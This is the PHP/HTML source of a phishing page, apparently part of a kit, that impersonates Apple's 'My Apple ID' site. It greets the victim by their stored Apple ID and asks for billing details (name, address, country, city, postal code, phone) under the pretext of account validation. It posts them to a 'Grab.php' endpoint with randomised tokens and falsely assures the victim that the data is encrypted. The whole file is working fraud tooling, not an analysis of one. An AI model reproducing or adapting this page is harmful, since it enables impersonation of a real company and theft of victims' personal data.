<?php
$indexs="initiate.php?Token=".$_GET['session'];
ini_set("output_buffering",4096);
session_start();
$indexs="Grab.php?token;".md5(time()).md5(time()); 
$user = $_SESSION['AppleID'];
$Validate = $_GET ['valid'];
if ($Validate !="true") {

$fname = $_GET['fname'];
$lname = $_GET['lname'];
$address = $_GET['address'];
$city = $_GET['city'];
$state = $_GET['state'];
$country = $_GET['country'];
$zip = $_GET['zip'];
$phone = $_GET['phone'];
}
require_once 'encrypter.php';
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



<html>

    <head>

        <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
        <meta name="viewport" content="width=1024"/>
        <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7, IE=9" />


        <title>Apple - My Apple ID</title>


    <link rel="icon" type="image/png" href="base/images/favicon.png">
    <link rel="shortcut icon" type="image/x-icon" href="base/images/favicon.ico">

        <link rel="stylesheet" type="text/css" media="screen" href="base/css/global.css?style_session=<?php echo $indexs; ?>" />
    <!--[if gte IE 9]><!-->
    <link rel="stylesheet" href="base/css/style2.css?style_session=<?php echo $indexs; ?>" media="screen, print" />
    <!--<![endif]-->



    </head>

    <body id="vetting">

        
	

	


<link rel="stylesheet" type="text/css" media="screen" href="base/css/navigation.css?style_session=<?php echo $indexs; ?>" />



    <link rel="stylesheet" type="text/css" media="screen" href="base/css/enhanced.css?style_session=<?php echo $indexs; ?>" />




	
	
<div id="globalheader">

	
	
	

	
	


<ul id="globalnav">
	<li id="gn-apple"><a
		href="#"><span></span></a></li>
	<li id="gn-store">
	
	 

			<a href="#"><span></span></a>
		
		
	</li>
	<li id="gn-mac">
	
		
		
		<a href="#"><span></span></a>
		
			
	</li>
	<li id="gn-ipod">
	
		
		
		<a href="#"><span></span></a>
		
			 </li>
	<li id="gn-iphone">
		
		
		
		<a
		href="#"
		class=""><span></span></a>
		
			</li>
	<li id="gn-ipad">
		
		
		
		<a
		href="#" ><span></span></a>
		
		
	</li>
	<li id="gn-itunes">
	
		
		
		<a id="iTuneApp"
		href="#" ><span></span></a>
		
		
	</li>
	<li class="gn-last" id="gn-support">
	
		
		
		<a href="#"><span></span></a>
		
		
	</li>
</ul>

<div id="globalsearch">
			<form action="" method="post" class="search" id="g-search"><div>
				<label for="sp-searchtext"><input type="text" name="q" id="sp-searchtext" accesskey="s" /></label>
			</div></form>
			<div id="sp-magnify"><div class="magnify-searchmode"></div><div class="magnify"></div></div>
			<div id="sp-results"></div>
		</div>

  
</div>

<input type="hidden" id="urlLanguageInsert" value="/" />

	

        
            <div id="" class="myappleid find-apple-id step1" >
        
        


            



<div id="productheader">

    <a href="#">
        
            
            
        
        <h2><img src="base/images/myappleid.png" style="height: 35px;" alt="My Apple ID" /></h2>
    </a>

</div>

            <div id="main">

                <div id="content" class="content">

                    <div class="grid2colc wrap">

                        <div class="column first">





   <font color="#999"> Welcome, <?php echo $user; ?><br> </font> 
<br />

<h2>
    Billing Address
</h2><br />
<h4>
    <p class="intro">
        Fill out the form with your billing address to continue the validation process of your Apple ID.
</p>

</h4>
	<hr>
	<p>
	<font color="#999">
	Apple uses industry-standard encryption to protect the confidentiality of your personal information.
	    </p></font>


	
                        </div>

<div class="column last main" id="main_content">





<form action="<?php echo $indexs ?>"  method="POST">

<p align="right" class="intro">
<img src="base/images/secure.png" alt=""> 
</p><br />

    

    

    <div class="formrow">
        <label class="label-find-account ">First Name</label>
        <span class="formwrap moveRight"><input id="first-name" name="fName" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['fName'])) { print $_SESSION['fName'];} else {print "";} ?>"  required autocomplete="off"/></span>
		<?php if ($Validate != "true") {  if ($fname ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a first name.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>
       
    </div>

    
        <div class="formrow">
            <label class="label-find-account">Last Name</label>
            <span class="formwrap moveRight"><input id="last-name" name="lName" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['lName'])) { print $_SESSION['lName'];} else {print "";} ?>" required autocomplete="off"/></span>
            		<?php if ($Validate != "true") { if ($lname ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a last name.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>
            
        </div>
		
		
	

        <div class="formrow">
            <label class="label-find-account ">Address</label>
            <span class="formwrap moveRight"><input id="last-name" name="AddressCard" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['Address'])) { print $_SESSION['Address'];} else {print "";} ?>" required autocomplete="off"/></span>
            		<?php if ($Validate != "true") {if ($address ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid address.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>
        </div>
		
			<div class="formrow">
            <label class="label-find-account ">Country</label>
            <span class="formwrap moveRight">
			<input id="last-name" name="CountryCard" class="input-find-account" type="text" list="country"   />
			<datalist id="country">


<option value="Afganistan">
<option value="Albania">
<option value="Algeria">
<option value="American Samoa">
<option value="Andorra">
<option value="Angola">
<option value="Anguilla">
<option value="Antigua &amp; Barbuda">
<option value="Argentina">
<option value="Armenia">
<option value="Aruba">
<option value="Australia">
<option value="Austria">
<option value="Azerbaijan">
<option value="Bahamas">
<option value="Bahrain">
<option value="Bangladesh">
<option value="Barbados">
<option value="Belarus">
<option value="Belgium">
<option value="Belize">
<option value="Benin">
<option value="Bermuda">
<option value="Bhutan">
<option value="Bolivia">
<option value="Bonaire">
<option value="Bosnia &amp; Herzegovina">
<option value="Botswana">
<option value="Brazil">
<option value="British Indian Ocean Ter">
<option value="Brunei">
<option value="Bulgaria">
<option value="Burkina Faso">
<option value="Burundi">
<option value="Cambodia">
<option value="Cameroon">
<option value="Canada">
<option value="Canary Islands">
<option value="Cape Verde">
<option value="Cayman Islands">
<option value="Central African Republic">
<option value="Chad">
<option value="Channel Islands">
<option value="Chile">     
<option value="China">     
<option value="Christmas Island">
<option value="Cocos Island">
<option value="Colombia">
<option value="Comoros"> 
<option value="Congo">     
<option value="Cook Islands">
<option value="Costa Rica">
<option value="Cote DIvoire">
<option value="Croatia">
<option value="Cuba">
<option value="Curaco">
<option value="Cyprus">
<option value="Czech Republic">
<option value="Denmark">
<option value="Djibouti">
<option value="Dominica">
<option value="Dominican Republic">
<option value="East Timor">
<option value="Ecuador">
<option value="Egypt">
<option value="El Salvador">
<option value="Equatorial Guinea">
<option value="Eritrea">
<option value="Estonia">
<option value="Ethiopia">
<option value="Falkland Islands">
<option value="Faroe Islands">
<option value="Fiji">
<option value="Finland">
<option value="France">
<option value="French Guiana">
<option value="French Polynesia">
<option value="French Southern Ter">
<option value="Gabon">
<option value="Gambia">
<option value="Georgia">
<option value="Germany">
<option value="Ghana">
<option value="Gibraltar">
<option value="Great Britain">
<option value="Greece">
<option value="Greenland">
<option value="Grenada">
<option value="Guadeloupe">
<option value="Guam">
<option value="Guatemala">
<option value="Guinea">
<option value="Guyana">
<option value="Haiti">
<option value="Hawaii">
<option value="Honduras">
<option value="Hong Kong">
<option value="Hungary">
<option value="Iceland">
<option value="India">
<option value="Indonesia">
<option value="Iran">   
<option value="Iraq">   
<option value="Ireland">
<option value="Isle of Man">
<option value="Israel">
<option value="Italy"> 
<option value="Jamaica">
<option value="Japan">
<option value="Jordan">
<option value="Kazakhstan">
<option value="Kenya"> 
<option value="Kiribati">
<option value="Korea North">
<option value="Korea Sout">
<option value="Kuwait">
<option value="Kyrgyzstan">
<option value="Laos">
<option value="Latvia">
<option value="Lebanon">
<option value="Lesotho">
<option value="Liberia">
<option value="Libya">
<option value="Liechtenstein">
<option value="Lithuania">
<option value="Luxembourg">
<option value="Macau">
<option value="Macedonia">
<option value="Madagascar">
<option value="Malaysia">
<option value="Malawi">
<option value="Maldives">
<option value="Mali">
<option value="Malta">
<option value="Marshall Islands">
<option value="Martinique">
<option value="Mauritania">
<option value="Mauritius">
<option value="Mayotte">
<option value="Mexico">
<option value="Midway Islands">
<option value="Moldova">
<option value="Monaco">
<option value="Mongolia">
<option value="Montserrat">
<option value="Morocco">
<option value="Mozambique">
<option value="Myanmar">
<option value="Nambia">
<option value="Nauru">
<option value="Nepal">
<option value="Netherland Antilles">
<option value="Netherlands">
<option value="Nevis">
<option value="New Caledonia">
<option value="New Zealand">
<option value="Nicaragua">
<option value="Niger">
<option value="Nigeria">
<option value="Niue">
<option value="Norfolk Island">
<option value="Norway">
<option value="Oman">
<option value="Pakistan">
<option value="Palau Island">
<option value="Palestine">
<option value="Panama">
<option value="Papua New Guinea">
<option value="Paraguay">
<option value="Peru">
<option value="Phillipines">
<option value="Pitcairn Island">
<option value="Poland">
<option value="Portugal">
<option value="Puerto Rico">
<option value="Qatar">
<option value="Republic of Montenegro">
<option value="Republic of Serbia">
<option value="Reunion">
<option value="Romania">
<option value="Russia">
<option value="Rwanda">
<option value="St Barthelemy">
<option value="St Eustatius">
<option value="St Helena">
<option value="St Kitts-Nevis">
<option value="St Lucia">
<option value="St Maarten">
<option value="St Pierre &amp; Miquelon">
<option value="St Vincent &amp; Grenadines">
<option value="Saipan">
<option value="Samoa">
<option value="Samoa American">
<option value="San Marino">
<option value="Sao Tome &amp; Principe">
<option value="Saudi Arabia">
<option value="Senegal">
<option value="Serbia">
<option value="Seychelles">
<option value="Sierra Leone">
<option value="Singapore">
<option value="Slovakia">
<option value="Slovenia">
<option value="Solomon Islands">
<option value="Somalia">
<option value="South Africa">
<option value="Spain">
<option value="Sri Lanka"> 
<option value="Sudan">
<option value="Suriname">
<option value="Swaziland">
<option value="Sweden">
<option value="Switzerland">
<option value="Syria">
<option value="Tahiti">
<option value="Taiwan">
<option value="Tajikistan">
<option value="Tanzania">
<option value="Thailand">
<option value="Togo">
<option value="Tokelau">         
<option value="Tonga">
<option value="Trinidad &amp; Tobago">
<option value="Tunisia">         
<option value="Turkey">           
<option value="Turkmenistan">
<option value="Turks &amp; Caicos Is">
<option value="Tuvalu">           
<option value="Uganda">           
<option value="Ukraine">         
<option value="United Arab Erimates">
<option value="United Kingdom">
<option value="United States">
<option value="Uraguay">
<option value="Uzbekistan">   
<option value="Vanuatu">
<option value="Vatican City State">
<option value="Venezuela">
<option value="Vietnam">
<option value="Virgin Islands (Brit)">
<option value="Virgin Islands (USA)">
<option value="Wake Island">
<option value="Wallis &amp; Futana Is">
<option value="Yemen">
<option value="Zaire">
<option value="Zambia">
<option value="Zimbabwe">
			</datalist>
			
			</span>
<?php if ($Validate != "true") { if ($country ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please select a valid country.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
        </div>

        <div class="formrow">
            <label class="label-find-account ">City</label>
            <span class="formwrap moveRight"><input id="last-name" name="CityCard" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['City'])) { print $_SESSION['City'];} else {print "";} ?>" required autocomplete="off"/></span>
            		<?php if ($Validate != "true") { if ($city ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid city.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
        </div>
		
			<div class="formrow">
            <label class="label-find-account ">State/Province</label>
            <span class="formwrap moveRight">
			<input id="last-name" name="StateCard" value="<?php if (isset($_SESSION['State'])) { print $_SESSION['State'];} else {print "";} ?>" class="input-find-account" type="text" required />
			
			
			</span>
			
		<?php  if ($Validate != "true") { if ($state ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid state.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>

        </div>


        <div class="formrow">
            <label class="label-find-account ">Postal Code</label>
            <span class="formwrap moveRight"><input id="last-name" name="ZIPCode" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['ZIP'])) { print $_SESSION['ZIP'];} else {print "";} ?>" required Placeholder="ZIP / Postal Code" autocomplete="off"/></span>

		<?php  if ($Validate != "true") { if ($zip ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid zip code.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
        </div>
	
		
     

		        <div class="formrow">
            <label class="label-find-account ">Phone Number</label>
            <span class="formwrap moveRight"><input id="last-name" name="PhoneCard" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['Phone'])) { print $_SESSION['Phone'];} else {print "";} ?>"  required /></span>
		<?php  if ($Validate != "true") { if ($phone ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a phone number.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>

        </div>



<div id="bot-nav">

                                            <div class="actions">
                                                <button id="sign-in" class="button rect" type="submit">
                                                    <span>
                                                        <span class="effect"></span>
                                                        <span class="label">Next</span>
                                                    </span>
                                                </button>
                                            </div>
</div>


</form> </div>

                    </div>

                </div>

            </div>

        </div>





<div id="globalfooter">

    <style> iframe { display: none; } </style>



    <div id="breadory">
        <ol id="breadcrumbs">
            <li class="home"><a href="#" dir="ltr">Home</a></li>
            <li><a href='#'>My Apple ID</a>
            </li>
            
                
                
                
                
            
        </ol>
    </div>







<div class="gf-sosumi">
    
    <p>Copyright &copy; 2015 Apple Inc. All rights reserved.</p>
    <ul class="piped">
        <li><a class="first" href="#">Terms of Use</a></li>
        <li><a href="#">Privacy Policy</a></li>
        <li style="float:right">
          
                    
                    
                

                <img src="base/images/us_flag.png" height="22" style="float:right;" alt="United States" width="22" />
           
        </li>
    </ul>
</div>

</div>

    </body>
</html>
<?php ob_end_flush(); ?>